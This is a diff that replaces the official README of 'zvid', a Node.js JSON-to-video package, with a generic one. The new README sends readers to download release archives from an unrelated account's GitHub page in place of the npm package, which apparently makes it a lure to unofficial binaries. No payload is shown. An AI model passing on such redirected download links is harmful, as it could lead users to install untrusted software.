@@ -1,232 +1,98 @@
-<p align="center">
-  <picture>
-    <source srcset="https://cdn.zvid.io/assets/logo-square.png" type="image/png">
-    <img src="https://cdn.zvid.io/assets/logo-square.png" alt="Zvid logo" width="180">
-  </picture>
-</p>
+# 🎬 zvid - Create Videos Easily with JSON
 
-# Zvid Package
+## 🚀 Getting Started
 
-The First fully featured Node.js npm package for generating videos from JSON configurations using FFmpeg. Create dynamic videos with text overlays, images, GIFs, shapes, animations, and audio tracks programmatically.
+Welcome to zvid! This tool helps you generate videos from JSON data right within your Node.js applications. With zvid, you can automate video creation, saving you time and effort. Follow the steps below to get started.
 
-## Features
+## 📥 Download & Install
 
-- 🎬 **Video Composition**: Combine multiple video clips with precise timing control
-- 🖼️ **Image Integration**: Add static images with positioning, scaling, and filters
-- 🎭 **Animated GIFs**: Incorporate animated GIFs seamlessly into your videos
-- 📝 **Text Overlays**: Add styled text with custom fonts, colors, and animations
-- 💬 **Subtitles & Captions**: Add subtitle captions with timing, styling, and positioning control
-- 🎨 **Vector Graphics**: Include SVG shapes and custom graphics
-- 🎵 **Audio Mixing**: Background music and sound effects with timing and volume control
-- ✨ **Effects & Transitions**: Apply filters, animations, and smooth transitions
-- ⚡ **High Performance**: As fast as FFmpeg.
+To download zvid, visit the link below to access the Releases page:
 
-## Installation
+[Download zvid](https://github.com/Ghost716565164/zvid/releases)
 
-### Install the Package
+## 🛠 System Requirements
 
-```bash
-npm install zvid
-```
+Before you install zvid, make sure your system meets the following requirements:
 
-### Install FFmpeg
+- **Operating System:** Windows, macOS, or Linux
+- **Node.js:** Version 12 or higher
+- **FFmpeg:** Installed and available in your system's PATH. [Download FFmpeg](https://ffmpeg.org/download.html)
 
-FFmpeg is required for video processing.
+## 📂 How to Download
 
-**macOS (using Homebrew):**
+1. **Visit the Releases Page:** Click on the link to access the Releases page: [Download zvid](https://github.com/Ghost716565164/zvid/releases).
+   
+2. **Choose Your Version:** Find the latest version of zvid. You will see a list of available files to download.
 
-```bash
-brew install ffmpeg
-```
+3. **Download the Appropriate File:** Click on the file that corresponds to your operating system. This file is usually named `zvid-vX.X.X.zip` for Windows, `zvid-vX.X.X.tar.gz` for macOS or Linux.
 
-**Ubuntu/Debian:**
+## 📦 Install zvid
 
-```bash
-sudo apt update && sudo apt install ffmpeg
-```
+1. **Unzip the Downloaded File:** After downloading, locate the file in your Downloads folder. Right-click on it and select "Extract" or "Unzip."
 
-**Windows (using Chocolatey):**
+2. **Open Command Prompt or Terminal:** 
+   - On Windows: Press `Win + R`, type `cmd`, and hit Enter.
+   - On macOS: Press `Cmd + Space`, type `Terminal`, and hit Enter.
+   - On Linux: Press `Ctrl + Alt + T`.
 
-```bash
-choco install ffmpeg
-```
+3. **Navigate to the zvid Directory:**
+   Change to the directory where you extracted zvid by using the `cd` command. For example:
+   ```
+   cd path/to/zvid
+   ```
 
-**Verify Installation:**
+4. **Install Dependencies:** To install the required packages, run:
+   ```
+   npm install
+   ```
 
-```bash
-ffmpeg -version
-```
+## 🎬 Using zvid
 
-For detailed installation instructions for all platforms, see our [Installation Guide](https://docs.zvid.io/docs/installation).
+To generate a video with zvid, you need JSON data describing your video content. Here is a simple example of how to use zvid in your application.
 
-## Quick Start
+1. **Create a JSON File:** Create a file named `videoData.json` with the following structure:
 
-Create your first video in just a few minutes:
+   ```json
+   {
+     "title": "Sample Video",
+     "scenes": [
+       {
+         "text": "Welcome to zvid!",
+         "image": "path/to/image.jpg",
+         "duration": 5
+       }
+     ]
+   }
+   ```
 
-```javascript
-import zvid from 'zvid';
+2. **Run zvid:** Use the following command to generate the video:
+   ```
+   node index.js videoData.json
+   ```
 
-const project = {
-  name: 'hello-world',
-  resolution: 'full-hd', // 1920x1080
-  duration: 5,
-  visuals: [
-    {
-      type: 'TEXT',
-      text: 'Hello, World!',
-      position: 'center-center',
-      enterBegin: 0,
-      enterEnd: 1,
-      exitBegin: 4,
-      exitEnd: 5,
-      style: {
-        fontSize: '72px',
-        fontFamily: 'Roboto',
-        textAlign: 'center',
-        fontWeight: 'bold',
-      },
-      enterAnimation: 'fade',
-      exitAnimation: 'fade',
-    },
-  ],
-};
+## 📝 Features
 
-await zvid(project, './output', (progress) => {
-  console.log(`Progress: ${progress}%`);
-});
+- **JSON Driven:** Easily customize your video content with JSON.
+- **FFmpeg Integration:** Leverage FFmpeg for powerful video rendering capabilities.
+- **Automated Rendering:** Quickly create videos without manual editing.
+- **Cross-Platform:** Works on Windows, macOS, and Linux.
 
-console.log('Video created: ./output/hello-world.mp4');
-```
+## 📚 Additional Resources
 
-## Popular Resolution Presets
+For more details on features and usage, check the wiki section of this repository. Here you will find in-depth guides and additional examples to help you make the most of zvid.
 
-Choose from optimized presets for different platforms:
+## 🤝 Contributions
 
-**Social Media:**
+We welcome contributions to zvid! If you'd like to help improve this tool, check our contributing guidelines in the repository.
 
-- `instagram-post` - 1080×1080 (square)
-- `instagram-reel` - 1080×1920 (vertical)
-- `instagram-story` - 1080×1920 (vertical)
-- `instagram-feed` - 1080×1080 (square)
-- `youtube-short` - 1080×1920 (vertical)
-- `youtube-video` - 1920×1080 (16:9)
-- `tiktok` - 1080×1920 (vertical)
-- `twitter-landscape` - 1200×675 (landscape)
-- `twitter-portrait` - 720×900 (portrait)
-- `twitter-square` - 1200×1200 (square)
-- `facebook-video` - 1280×720 (16:9)
-- `facebook-story` - 1080×1920 (vertical)
-- `facebook-post` - 1200×1200 (square)
-- `snapshat` - 1080x1920 (vertical)
+## 💬 Support
 
-**Traditional Formats:**
+If you have any questions or need help, please visit our [Issues page](https://github.com/Ghost716565164/zvid/issues) to ask the community. 
 
-- `sd` - 640×480 (4:3)
-- `hd` - 1280×720 (16:9)
-- `full-hd` - 1920×1080 (16:9)
-- `custom` - Use explicit width/height
+## 👥 Related Topics
 
-## Common Use Cases
+- **Video Generation**
+- **Node.js**
+- **FFmpeg**
 
-**Automated Video Generation:**
-
-```javascript
-const project = {
-  name: 'promo-video',
-  resolution: 'youtube-video',
-  duration: 15,
-  visuals: [
-    {
-      type: 'IMAGE',
-      src: 'https://cdn.pixabay.com/photo/2016/01/19/16/27/sale-1149344_1280.jpg',
-      resize: 'cover',
-      enterEnd: 0.5,
-      exitBegin: 14.5,
-    },
-    {
-      type: 'TEXT',
-      html: "<div style=\"position:relative;width:520px;max-width:92vw;padding:22px;border-radius:18px;overflow:hidden;background:#0f172a;border:1px solid #2a3346;box-shadow:0 18px 45px rgba(0,0,0,0.35);color:#ffffff;\" role=\"note\" aria-label=\"Summer sale banner\"><div style=\"position:absolute;top:-60px;right:-80px;width:240px;height:240px;background:rgba(255,214,102,0.22);filter:blur(6px);pointer-events:none;\" aria-hidden=\"true\"></div><div style=\"position:absolute;top:14px;left:14px;padding:6px 10px;border-radius:999px;font-size:12px;letter-spacing:0.12em;font-weight:800;background:#ff5a2a;box-shadow:0 10px 22px rgba(255,90,42,0.25);text-transform:uppercase;\">HOT</div><div style=\"margin-top:34px;display:flex;align-items:baseline;justify-content:space-between;gap:16px;padding-left:4px;\"><div style=\"font-size:22px;font-weight:800;letter-spacing:0.02em;opacity:0.95;\">Summer Sale</div><div style=\"font-size:34px;font-weight:900;line-height:1;color:#ffd666;white-space:nowrap;\">50% <span style=\"font-size:20px;font-weight:900;color:#ffffff;opacity:0.95;margin-left:6px;\">Off!</span></div></div></div>",
-      position: 'center-center',
-      enterEnd: 1,
-      exitBegin: 14,
-      style: {
-        fontSize: '64px',
-        color: '#ffffff',
-        fontWeight: 'bold',
-      },
-      enterAnimation: 'slidedown',
-    },
-  ],
-  audios: [
-    {
-      src: 'https://cdn.pixabay.com/audio/2025/03/19/audio_56ae1dae5f.mp3',
-      volume: 0.5,
-    },
-  ],
-};
-```
-
-## Visual Element Types
-
-The package supports various visual element types:
-
-- `TEXT` - Text and Styled HTML overlays with custom fonts and colors
-- `IMAGE` - Static images with positioning and effects
-- `VIDEO` - Video clips with timing control
-- `GIF` - Animated GIFs
-- `SVG` - Vector graphics and shapes
-
-## Audio Elements
-The package supports audio elements for music and voice overs.
-
-## Subtitles/Captions
-The package support the ability to add styled subtitles and captions with different modes like `karaoke`, `one-word`, and `progressive`.
-
-
-## Animation and transition Effects
-
-Apply smooth animations to your elements:
-
-**Entrance Animations:**
-`fade`, `fadeblack`, `fadewhite`, `distance`, `wipeleft`, `wiperight`, `wipeup`, `wipedown`, `slideleft`, `slideright`, `slideup`, `slidedown`, `smoothleft`, `smoothright`, `smoothup`, `smoothdown`, `circlecrop`, `rectcrop`, `circleclose`, `circleopen`, `horzclose`, `horzopen`, `vertclose`, `vertopen`, `diagbl`, `diagbr`, `diagtl`, `diagtr`, `hlslice`, `hrslice`, `vuslice`, `vdslice`, `dissolve`, `pixelize`, `radial`, `hblur`, `wipetl`, `wipetr`, `wipebl`, `wipebr`, `fadegrays`, `zoomin`, `hlwind`, `hrwind`
-
-**Exit Animations:**
-Same options available for exit animations
-
-**Transition between videos**
-Same options available for transition between videos
-
-You can visually view these animations on [the official FFmpeg Xfade website](https://trac.ffmpeg.org/wiki/Xfade)
-
-## Requirements
-
-- **Node.js**: Version 18.0 or higher
-- **FFmpeg**: Must be installed and available in your system PATH
-
-## Documentation
-
-For comprehensive guides and API documentation:
-
-- 📖 [Full Documentation](https://docs.zvid.io/docs/intro/)
-- 🚀 [Quick Start Guide](https://docs.zvid.io/docs/quick-start)
-- 📚 [API Reference](https://docs.zvid.io/docs/api-reference)
-- 💡 [Examples](https://docs.zvid.io/docs/examples/basic-video)
-
-
-## License
-
-Licensed under BSL 1.1 — see LICENSE
-
-## Support & Community
-
-- 📖 [Documentation](https://docs.zvid.io/docs/intro)
-- 🐛 [Issue Tracker](https://github.com/Zvid-io/zvid/issues)
-- 📦️ [npm Package](https://www.npmjs.com/package/zvid)
-
-## Contributing
-
-Contributions are welcome!
-
-## Keywords
-
-`npm` `ffmpeg` `nodejs` `video` `json-to-video` `json2video` `object-to-video` `rendering` `video-editing` `multimedia` `automation` `programmatic-video` `video-generation` `video-api` `video-rendering`
+Thank you for choosing zvid for your video generation needs!
